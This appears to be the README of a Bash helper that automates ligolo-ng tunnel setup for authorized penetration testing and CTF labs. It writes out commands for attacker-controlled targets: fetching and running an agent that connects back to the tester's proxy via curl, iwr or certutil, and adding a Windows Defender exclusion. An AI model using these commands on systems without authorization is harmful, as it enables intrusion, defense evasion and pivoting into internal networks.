<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/docs/assets/logo-light.svg">
  <img alt="LigoloSupport" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Bash](https://img.shields.io/badge/language-Bash-orange.svg)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**One-command setup script for ligolo-ng tunneling**

Auto-downloads proxy and agent binaries, configures TUN interface, starts a file server for agent transfer, and provides copy-paste commands with your IP pre-filled. No proxychains needed -- access target networks directly.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Commands](#all-commands) • [Configuration](#configuration) • [Troubleshooting](#troubleshooting)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**One-Command Setup**
Run `sudo ./ligolo-helper.sh auto` and the script downloads ligolo-ng binaries, creates the TUN interface, starts a file server on port 8000, and launches the proxy. Follow the on-screen instructions to connect your first agent.

</td>
<td width="50%">

**Auto IP Detection**
Automatically detects your attack IP by checking `tun0`, `tun1`, `tap0`, and the default route in priority order. All generated commands use your actual IP -- no manual substitution needed.

</td>
</tr>
<tr>
<td width="50%">

**Multi-Platform Agents**
Downloads agent binaries for Linux (amd64/arm64), Windows (amd64), and macOS (arm64). Copy-paste transfer commands provided for each platform including curl, PowerShell `iwr`, and certutil fallback.

</td>
<td width="50%">

**Clean Teardown**
`sudo ./ligolo-helper.sh cleanup` removes all routes, stops the file server and proxy, and tears down the TUN interface in order. No orphaned processes or stale routes left behind.

</td>
</tr>
<tr>
<td width="50%">

**Step-by-Step Guidance**
After setup, the script displays numbered steps with exact commands for agent transfer, connection, session selection, route addition, and tunnel start. Each step shows what output to expect.

</td>
<td width="50%">

**Modular Commands**
Each operation is available as a standalone subcommand: `download`, `setup-tun`, `teardown-tun`, `proxy`, `add-route`, `del-route`, `agent-cmd`, `status`. Use `auto` for the full workflow or individual commands for granular control.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>Linux</td>
<td>Kali, Ubuntu, Debian</td>
<td>TUN interface support</td>
</tr>
<tr>
<td>Root privileges</td>
<td>sudo</td>
<td>TUN interface creation</td>
</tr>
<tr>
<td>curl, jq, tar</td>
<td>Any</td>
<td>Binary download and extraction</td>
</tr>
<tr>
<td>python3</td>
<td>Any (optional)</td>
<td>HTTP file server for agent transfer</td>
</tr>
</table>

### Install

```bash
# Download the script
curl -O https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh
chmod +x ligolo-helper.sh
```

### Run

```bash
# Full auto-setup -- that's it
sudo ./ligolo-helper.sh auto
```

Follow the on-screen instructions to transfer the agent, connect, select a session, add routes, and start the tunnel.

### Verification

```bash
# After tunnel is running, test connectivity
nmap -sV 10.10.10.0/24           # Scan target network
ssh user@10.10.10.20             # SSH to internal host
curl http://10.10.10.50          # Access internal web server

# No proxychains needed
```

### Cleanup

```bash
sudo ./ligolo-helper.sh cleanup
```

---

## What `auto` Does

1. **Downloads binaries** -- Fetches the latest ligolo-ng proxy and agent binaries for Linux, Windows, and macOS from GitHub releases
2. **Creates TUN interface** -- Sets up the `ligolo` TUN interface and brings it up
3. **Starts file server** -- Launches `python3 -m http.server 8000` in the binary directory for agent transfer
4. **Displays instructions** -- Shows numbered steps with your actual IP pre-filled in all commands
5. **Starts proxy** -- Launches `ligolo-proxy` on port 11601 with a self-signed certificate

---

## All Commands

| Command | Root | Description |
|---------|------|-------------|
| `auto` | Yes | Full automatic setup -- download, configure, start proxy |
| `cleanup` | Yes | Stop everything: kill proxy, file server, remove routes and TUN |
| `download` | No | Download ligolo-ng binaries to `~/.ligolo-ng` |
| `setup-tun` | Yes | Create and activate TUN interface |
| `teardown-tun` | Yes | Remove TUN interface |
| `proxy [opts]` | No | Start proxy with custom options passed through |
| `add-route <cidr>` | Yes | Add route to TUN (e.g., `10.10.10.0/24`) |
| `del-route <cidr>` | Yes | Remove a route from TUN |
| `agent-cmd [ip]` | No | Show agent commands for all platforms |
| `status` | No | Show binary, TUN, route, and proxy status |

---

## Example Output

```
╔══════��════════════════════════════════════════════════════════════════╗
║                        FOLLOW THESE STEPS                             ║
╚════════════��═══════════════════════════���══════════════════════════════╝

STEP 1: Download agent on target machine

  TARGET IS LINUX:
    curl http://10.10.14.5:8000/ligolo-agent -o /tmp/a && chmod +x /tmp/a

  TARGET IS WINDOWS (PowerShell):
    iwr http://10.10.14.5:8000/ligolo-agent.exe -o a.exe

STEP 2: Run agent on target

  LINUX:
    /tmp/a -connect 10.10.14.5:11601 -ignore-cert

  WINDOWS:
    .\a.exe -connect 10.10.14.5:11601 -ignore-cert

STEP 3: Wait for agent to connect

  You will see: INFO[0042] Agent joined: YOURPC\username @ YOURPC

STEP 4: Select the agent and find target network

  Type: session     (Enter, then Enter again to select)
  Type: ifconfig    (Look for internal 10.x.x.x or 192.168.x.x)

STEP 5: Add route (OPEN NEW TERMINAL)

  sudo ./ligolo-helper.sh add-route 10.10.10.0/24

STEP 6: Start tunnel (back in proxy console)

  tunnel_start --tun ligolo
```

---

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `LIGOLO_DIR` | `~/.ligolo-ng` | Binary storage directory |
| `TUN_NAME` | `ligolo` | TUN interface name |
| `PROXY_PORT` | `11601` | Proxy listen port |

```bash
# Custom port example
PROXY_PORT=443 sudo ./ligolo-helper.sh auto

# Custom binary directory
LIGOLO_DIR=/opt/ligolo sudo ./ligolo-helper.sh download
```

### IP Detection Order

The script detects your attack IP automatically:

1. `tun0` -- HackTheBox, TryHackMe, most VPNs
2. `tun1` -- Secondary tunnel
3. `tap0` -- Alternative tunnel type
4. Default route -- Fallback

---

## Architecture

### Project Structure

```
ligolo-helper.sh               Single-file setup script (all logic)
README.md                      Documentation
LICENSE                         MIT License
```

### Execution Flow

```
sudo ./ligolo-helper.sh auto
    │
    ├── [1/3] download_binaries()
    │     ├── Fetch latest version tag from GitHub API
    │     ├── Download proxy (linux/amd64)
    │     ├── Download agents (linux/amd64, linux/arm64, windows/amd64, darwin/arm64)
    │     └── Extract and chmod +x
    │
    ├── [2/3] setup_tun()
    │     ├── ip tuntap add user root mode tun ligolo
    │     └── ip link set ligolo up
    │
    ├── [3/3] start_file_server()
    │     └── python3 -m http.server 8000 (background)
    │
    ├── Display step-by-step instructions (IP auto-filled)
    │
    └── Start ligolo-proxy on 0.0.0.0:11601
          └── trap cleanup EXIT (kills file server on Ctrl+C)
```

### Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Clean exit or cleanup complete |
| `1` | Missing dependencies, missing binaries, or not root |

---

## Platform Support

<table>
<tr>
<th>Feature</th>
<th>Linux</th>
<th>Notes</th>
</tr>
<tr>
<td>Proxy binary</td>
<td>amd64</td>
<td>Auto-downloaded from GitHub releases</td>
</tr>
<tr>
<td>Agent binaries</td>
<td>amd64, arm64</td>
<td>Linux, Windows (amd64), macOS (arm64)</td>
</tr>
<tr>
<td>TUN interface</td>
<td>Any kernel with tun/tap</td>
<td>Requires root and iproute2</td>
</tr>
<tr>
<td>File server</td>
<td>Any with python3</td>
<td>Optional; manual transfer if python3 unavailable</td>
</tr>
<tr>
<td>IP detection</td>
<td>Any</td>
<td>tun0/tun1/tap0/default route priority</td>
</tr>
</table>

---

## Troubleshooting

### Agent won't connect

Make sure the proxy port is open:
```bash
iptables -I INPUT -p tcp --dport 11601 -j ACCEPT
```

### Windows Defender blocks agent

Add an exclusion on the target before downloading:
```powershell
Add-MpPreference -ExclusionPath "C:\Users\Administrator\a.exe"
```
Then re-download and run the agent.

### Can't download on Windows target

Try certutil instead:
```cmd
certutil -urlcache -split -f http://YOUR_IP:8000/ligolo-agent.exe a.exe
```

### Connection drops when adding route

**Do NOT route the target's own network through ligolo.** This breaks your connection to the target.

Ligolo is for reaching *other* networks behind the target:
- Your target: `10.1.146.220` (you reach via RDP/VPN)
- Target can see: `192.168.x.x` (you can't reach directly)
- Route the *internal* network through ligolo, not `10.1.146.0/24`

If you accidentally added a bad route:
```bash
sudo ./ligolo-helper.sh cleanup
```

### Route already exists

Remove it first:
```bash
./ligolo-helper.sh del-route 10.10.10.0/24
```

### Invalid CIDR prefix error

The network address must align to the prefix boundary:
- `/24` -- last octet must be 0 (e.g., `10.1.146.0/24`)
- `/18` -- third octet must be 0, 64, 128, or 192 (e.g., `10.1.128.0/18`)

### TUN interface issues

Reset everything:
```bash
sudo ./ligolo-helper.sh cleanup
sudo ./ligolo-helper.sh auto
```

---

## Security

### Vulnerability Reporting

Do **not** open public issues for security vulnerabilities. See [SECURITY.md](SECURITY.md) for responsible disclosure instructions.

### What LigoloSupport Does NOT Do

- Does not modify ligolo-ng source code or binaries
- Does not store credentials or sensitive data
- Does not persist after cleanup
- Does not open ports other than the proxy port and file server
- Does not bypass any security controls

---

## Credits

- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) by Nicolas Chatelain
- [Official Documentation](https://docs.ligolo.ng/)

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

## Resources

- [Releases](https://github.com/Real-Fruit-Snacks/LigoloSupport/releases)
- [Issues](https://github.com/Real-Fruit-Snacks/LigoloSupport/issues)
- [Security Policy](https://github.com/Real-Fruit-Snacks/LigoloSupport/security/policy)
- [Contributing](CONTRIBUTING.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Deadwater](https://github.com/Real-Fruit-Snacks/Deadwater) • [Deluge](https://github.com/Real-Fruit-Snacks/Deluge) • [Depth](https://github.com/Real-Fruit-Snacks/Depth) • [Dew](https://github.com/Real-Fruit-Snacks/Dew) • [Droplet](https://github.com/Real-Fruit-Snacks/Droplet) • [Fathom](https://github.com/Real-Fruit-Snacks/Fathom) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [Grotto](https://github.com/Real-Fruit-Snacks/Grotto) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Maelstrom](https://github.com/Real-Fruit-Snacks/Maelstrom) • [Rapids](https://github.com/Real-Fruit-Snacks/Rapids) • [Ripple](https://github.com/Real-Fruit-Snacks/Ripple) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • [Seep](https://github.com/Real-Fruit-Snacks/Seep) • [Shallows](https://github.com/Real-Fruit-Snacks/Shallows) • [Siphon](https://github.com/Real-Fruit-Snacks/Siphon) • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • [Spillway](https://github.com/Real-Fruit-Snacks/Spillway) • [Surge](https://github.com/Real-Fruit-Snacks/Surge) • [Tidemark](https://github.com/Real-Fruit-Snacks/Tidemark) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • [Undercurrent](https://github.com/Real-Fruit-Snacks/Undercurrent) • [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) • [Vapor](https://github.com/Real-Fruit-Snacks/Vapor) • [Wellspring](https://github.com/Real-Fruit-Snacks/Wellspring) • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
